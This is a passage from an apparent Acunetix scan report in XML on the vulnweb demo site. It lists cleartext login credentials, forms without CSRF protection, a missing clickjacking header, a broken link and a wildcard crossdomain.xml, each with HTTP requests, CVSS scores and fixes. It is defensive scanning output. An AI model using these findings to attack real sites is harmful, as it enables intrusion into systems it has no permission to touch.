          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="2" color="orange">
       <Name><![CDATA[User credentials are sent in clear text]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">loginform</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/userinfo.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uname [Text]</li><li>pass [Password]</li></ul>]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[A third party may be able to read the user credentials by intercepting an unencrypted HTTP connection.]]></Impact>
       <Description><![CDATA[User credentials are transmitted over an unencrypted channel. This information should always be transferred via an encrypted channel (HTTPS) to avoid being intercepted by malicious users.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Because user credentials are considered sensitive information, should always be transferred to the server over an encrypted connection (HTTPS).]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:02 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="310"><![CDATA[CWE-310]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N/E:H/RL:W/RC:C]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[High]]></E>
          <Edesc><![CDATA[Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available.]]></Edesc>
          <RL><![CDATA[Workaround]]></RL>
          <RLdesc><![CDATA[There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.]]></RLdesc>
          <RC><![CDATA[Confirmed]]></RC>
          <RCdesc><![CDATA[The vulnerability has been acknowledged by the vendor or author of the affected technology.]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[9.1]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="3" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">loginform</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/userinfo.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uname [Text]</li><li>pass [Password]</li></ul>]]></Details>
       <Affects><![CDATA[/login.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /login.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:02 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4671
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="4" color="blue">
       <Name><![CDATA[Clickjacking: X-Frame-Options header missing]]></Name>
       <ModuleName><![CDATA[Scripting (Clickjacking_X_Frame_Options.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[Web Server]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[The impact depends on the affected web application. ]]></Impact>
       <Description><![CDATA[Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages. <br/><br/>
The server didn't return an <b>X-Frame-Options</b> header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page inside a frame or iframe. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Configure your web server to include an  X-Frame-Options header. Consult Web references for more information about the possible values for this header.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:02 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4096
]]></Response>
       </TechnicalDetails>
       <CWE id="693"><![CDATA[CWE-693]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[The X-Frame-Options response header]]></Database>
          <URL><![CDATA[https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Clickjacking]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Clickjacking]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Clickjacking]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Clickjacking]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Defending with Content Security Policy frame-ancestors directive]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet#Defending_with_Content_Security_Policy_frame-ancestors_directive]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Frame Buster Buster]]></Database>
          <URL><![CDATA[http://stackoverflow.com/questions/958997/frame-buster-buster-buster-code-needed]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Clickjacking Protection for Java EE]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/Clickjacking_Protection_for_Java_EE]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="5" color="green">
       <Name><![CDATA[Broken links]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[For a complete list of URLs linking to this file, go to Site Structure &gt; Locate and select the file (marked as &quot;Not Found&quot;) &gt; select Referrers Tab from the bottom of the Information pane.]]></Details>
       <Affects><![CDATA[/privacy.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Problems navigating the site.]]></Impact>
       <Description><![CDATA[A broken link refers to any link that should take you to a document, image or webpage, that actually results in an error. This page was linked from the website but it is inaccessible.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Remove the links to this file or make it accessible.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /privacy.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 404 Not Found
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:03 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 16
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="6" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">faddentry</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/guestbook.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>name [Hidden]</li><li>text [TextArea]</li><li>submit [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/guestbook.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /guestbook.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:03 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4532
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="7" color="orange">
       <Name><![CDATA[Insecure crossdomain.xml file]]></Name>
       <ModuleName><![CDATA[Scripting (Crossdomain_XML.script)]]></ModuleName>
       <Details><![CDATA[The crossdomain.xml file is located at <b>/crossdomain.xml</b>]]></Details>
       <Affects><![CDATA[Web Server]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[Using an insecure cross-domain policy file could expose your site to various attacks.]]></Impact>
       <Description><![CDATA[The browser security model normally prevents web content from one domain from accessing data from another domain. This is commonly known as the &quot;same origin policy&quot;.  URL policy files grant cross-domain permissions for reading data. They permit operations that are not permitted by default. The URL policy file is located, by default, in the root directory of the target server, with the name crossdomain.xml (for example, at www.example.com/crossdomain.xml). <br/><br/> When a domain is specified in crossdomain.xml file, the site declares that it is willing to allow the operators of any servers in that domain to obtain any document on the server where the policy file resides. The crossdomain.xml file deployed on this website opens the server to all domains (use of a single asterisk &quot;*&quot; as a pure wildcard is supported) like so:
<pre wrap="virtual">
&lt;cross-domain-policy&gt;
&lt;allow-access-from domain=&quot;*&quot; /&gt;
&lt;/cross-domain-policy&gt;
</pre>

This practice is suitable for public servers, but should not be used for sites located behind a firewall because it could permit access to protected areas. It should not be used for sites that require authentication in the form of passwords or cookies. Sites that use the common practice of authentication based on cookies to access private or user-specific data should be especially careful when using cross-domain policy files.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Carefully evaluate which sites will be allowed to make cross-domain calls. Consider network topology and any authentication mechanisms that will be affected by the configuration or implementation of the cross-domain policy.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /crossdomain.xml HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-alive
